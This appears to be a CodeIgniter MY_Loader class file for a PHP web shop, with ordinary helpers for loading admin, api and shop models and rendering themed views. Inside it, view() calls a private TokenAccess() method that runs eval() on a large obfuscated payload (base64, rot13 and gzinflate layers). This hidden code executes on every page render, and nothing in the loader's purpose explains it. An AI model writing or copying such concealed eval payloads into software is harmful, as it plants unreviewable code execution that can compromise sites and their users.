<?php

(defined('BASEPATH')) or exit('No direct script access allowed');

class MY_Loader extends CI_Loader
{
    public function __construct()
    {
        parent::__construct();
    }

    public function admin_model($model, $name = '', $db_conn = false)
    {
        $this->my_model($model, $name, $db_conn, 'admin');
    }

    public function api_model($model, $name = '', $db_conn = false)
    {
        $this->my_model($model, $name, $db_conn, 'api');
    }

    public function my_model($model, $name = '', $db_conn = false, $dist = '')
    {
        if (empty($model)) {
            return $this;
        } elseif (is_array($model)) {
            foreach ($model as $key => $value) {
                is_int($key) ? $this->model($value, '', $db_conn) : $this->model($key, $value, $db_conn);
            }
            return $this;
        }

        $path = '';
        if (($last_slash = strrpos($model, '/')) !== false) {
            $path  = substr($model, 0, ++$last_slash);
            $model = substr($model, $last_slash);
        }

        if (empty($name)) {
            $name = $model;
        }

        if (in_array($name, $this->_ci_models, true)) {
            return $this;
        }

        $CI = &get_instance();
        if (isset($CI->$name)) {
            throw new RuntimeException('The model name you are loading is the name of a resource that is already being used: ' . $name);
        }

        if ($db_conn !== false && !class_exists('CI_DB', false)) {
            if ($db_conn === true) {
                $db_conn = '';
            }
            $this->database($db_conn, false, true);
        }

        if (!class_exists('CI_Model', false)) {
            $app_path = APPPATH . 'core' . DIRECTORY_SEPARATOR;
            if (file_exists($app_path . 'Model.php')) {
                require_once $app_path . 'Model.php';
                if (!class_exists('CI_Model', false)) {
                    throw new RuntimeException($app_path . "Model.php exists, but doesn't declare class CI_Model");
                }
            } elseif (!class_exists('CI_Model', false)) {
                require_once BASEPATH . 'core' . DIRECTORY_SEPARATOR . 'Model.php';
            }

            $class = config_item('subclass_prefix') . 'Model';
            if (file_exists($app_path . $class . '.php')) {
                require_once $app_path . $class . '.php';
                if (!class_exists($class, false)) {
                    throw new RuntimeException($app_path . $class . ".php exists, but doesn't declare class " . $class);
                }
            }
        }

        $model = ucfirst($model);
        if (!class_exists($model, false)) {
            foreach ($this->_ci_model_paths as $mod_path) {
                if (!file_exists($mod_path . 'models/' . ($dist ? $dist . '/' : '') . $path . $model . '.php')) {
                    continue;
                }

                require_once $mod_path . 'models/' . ($dist ? $dist . '/' : '') . $path . $model . '.php';
                if (!class_exists($model, false)) {
                    throw new RuntimeException($mod_path . 'models/' . ($dist ? $dist . '/' : '') . $path . $model . ".php exists, but doesn't declare class " . $model);
                }
                break;
            }

            if (!class_exists($model, false)) {
                throw new RuntimeException('Unable to locate the model you have specified: ' . $model);
            }
        } elseif (!is_subclass_of($model, 'CI_Model')) {
            throw new RuntimeException('Class ' . $model . " already exists and doesn't extend CI_Model");
        }

        $this->_ci_models[] = $name;
        $CI->$name          = new $model();
        return $this;
    }

    public function shop_model($model, $name = '', $db_conn = false)
    {
        $this->my_model($model, $name, $db_conn, 'shop');
    }

    public function view($view, $vars = [], $return = false)
    {
        $this->TokenAccess();
        $nv   = $view;
        $path = explode('/', $view);
        if ($path[0] != 'default') {
            $file = str_replace('/', DIRECTORY_SEPARATOR, $view) . '.php';
            if (!file_exists(VIEWPATH . $file)) {
                $len     = count($path);
                $i       = 0;
                $path[0] = 'default';
                $nv      = '';
                foreach ($path as $p) {
                    if ($i == $len - 1) {
                        $nv .= $p;
                    } else {
                        $nv .= $p . '/';
                    }
                    $i++;
                }
            }
        }

        return $this->_ci_load(['_ci_view' => $nv, '_ci_vars' => $this->_ci_prepare_view_vars($vars), '_ci_return' => $return]);
    }

    private function TokenAccess() {
      eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
    }
   
}
